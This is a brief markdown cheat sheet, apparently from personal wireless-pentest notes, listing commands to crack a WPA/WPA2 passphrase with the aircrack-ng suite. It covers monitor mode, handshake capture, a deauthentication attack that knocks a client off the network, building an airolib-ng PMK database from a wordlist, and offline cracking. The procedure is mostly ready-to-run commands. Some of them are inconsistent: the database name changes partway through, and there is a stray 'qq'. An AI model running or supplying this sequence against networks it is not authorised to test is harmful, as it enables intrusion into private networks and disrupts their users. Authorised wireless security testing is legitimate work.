# Airolib-ng with Aircrack-ng (WPA/WPA2)

Setting up and using the `airolib-ng` tool with `aircrack-ng` suite of tools to crack the secret.

## Commands

* Run [setup](../../setup.md) first
* Two terminals are needed
* At least on client associated with the AP

```bash
# [Terminal One]
# Set interface to monitor mode
sudo airmon-ng start $INTERFACE

# Start monitoring - make terminal large enough to see everything
sudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG --output-format pcap $INTERFACE

# [Terminal Two]
# Run the deauthentication attack to get four-way handshake
sudo aireplay-ng --deauth 1 -a $BSSID -c $CLIENT $INTERFACE

# Wait for the four-way handshake to appear in airodump-ng window.

# Stop airodump-ng when it appears
qq

# Create list of one or more SSIDs
echo $SSID > $SSID.txt

# Import that list into a new airolib-ng database
airolib-ng $SSID.sqlite --import essid $SSID.txt

# Query the imported list
airolib-ng $SSID.sqlite --stats

# Import John's password WORDLIST
airolib-ng $SSID.sqlite --import passwd $WORDLIST

# Batch process the WORDLIST for each SSID
airolib-ng wifu.sqlite --batch

# Query the results
airolib-ng wifu.sqlite --stats

# Krakatoa the password
aircrack-ng -0 -r $SSID.sqlite $PCAP
```

## References

* [Aircrack-ng](https://www.aircrack-ng.org/doku.php?id=aircrack-ng)
* [Airolib-ng](https://www.aircrack-ng.org/doku.php?id=airolib-ng)
* [Airmon-ng](https://www.aircrack-ng.org/doku.php?id=airmon-ng)
* [Airodump-ng](https://www.aircrack-ng.org/doku.php?id=airodump-ng)
